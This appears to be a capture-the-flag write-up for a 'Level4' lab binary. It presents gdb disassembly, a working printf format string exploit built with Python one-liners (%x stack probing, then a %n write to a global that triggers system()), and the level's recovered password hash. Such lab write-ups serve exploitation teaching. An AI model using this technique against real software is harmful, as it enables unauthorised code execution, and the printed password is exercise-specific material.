# Level4

    (gdb) disas main
        Dump of assembler code for function main:
        0x080484a7 <+0>:	push   %ebp
        0x080484a8 <+1>:	mov    %esp,%ebp
        0x080484aa <+3>:	and    $0xfffffff0,%esp
        0x080484ad <+6>:	call   0x8048457 <n>
        0x080484b2 <+11>:	leave  
        0x080484b3 <+12>:	ret    
    End of assembler dump.
    (gdb) disas n
    Dump of assembler code for function n:
        0x08048457 <+0>:	push   %ebp
        0x08048458 <+1>:	mov    %esp,%ebp
        0x0804845a <+3>:	sub    $0x218,%esp
        0x08048460 <+9>:	mov    0x8049804,%eax
        0x08048465 <+14>:	mov    %eax,0x8(%esp)
        0x08048469 <+18>:	movl   $0x200,0x4(%esp)
        0x08048471 <+26>:	lea    -0x208(%ebp),%eax
        0x08048477 <+32>:	mov    %eax,(%esp)
        0x0804847a <+35>:	call   0x8048350 <fgets@plt>
        0x0804847f <+40>:	lea    -0x208(%ebp),%eax
        0x08048485 <+46>:	mov    %eax,(%esp)
        0x08048488 <+49>:	call   0x8048444 <p>
        0x0804848d <+54>:	mov    0x8049810,%eax
        0x08048492 <+59>:	cmp    $0x1025544,%eax
        0x08048497 <+64>:	jne    0x80484a5 <n+78>
        0x08048499 <+66>:	movl   $0x8048590,(%esp)
        0x080484a0 <+73>:	call   0x8048360 <system@plt>
        0x080484a5 <+78>:	leave  
        0x080484a6 <+79>:	ret    
    End of assembler dump.
    (gdb) disas p
    Dump of assembler code for function p:
        0x08048444 <+0>:	push   %ebp
        0x08048445 <+1>:	mov    %esp,%ebp
        0x08048447 <+3>:	sub    $0x18,%esp
        0x0804844a <+6>:	mov    0x8(%ebp),%eax
        0x0804844d <+9>:	mov    %eax,(%esp)
        0x08048450 <+12>:	call   0x8048340 <printf@plt>
        0x08048455 <+17>:	leave  
        0x08048456 <+18>:	ret    
    End of assembler dump.

This is quite similar to the previous level. The main calls the n function, the n function calls the p function (which only calls printf before returning), and then makes a comparison with 0x1025544 (16930116 in dec). If the comparison is equal, the function prints the password of level5.

In the last exercise it was easy to send 0x40 (64 dec) characters, but here it's quite a bigger number. We will need to find an elegant solution.

Just kidding I'm gonna do exactly the same thing as before.

First of all, let's find the beginning of our input in the stack :

    $ python -c 'print "AAAA" + " %x" * 20' > payload
    $ cat payload | ./level4 
    AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825

We can see it corresponds to the 12th %x, so we will set the address to the 12th argument (%12$n).

In the n() function :

        0x08048488 <+49>:	call   0x8048444 <p>
        0x0804848d <+54>:	mov    0x8049810,%eax

We just have to pass the address being moved to the EAX register as an argument like in the previous exercise, followed by 16930112 characters (the address is still 4 bytes)

    $ python -c 'print "\x10\x98\x04\x08" + "%16930112c%12$n"' > payload
    $ cat payload - | ./level4
    [... 17 millions characters being printed ...]
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
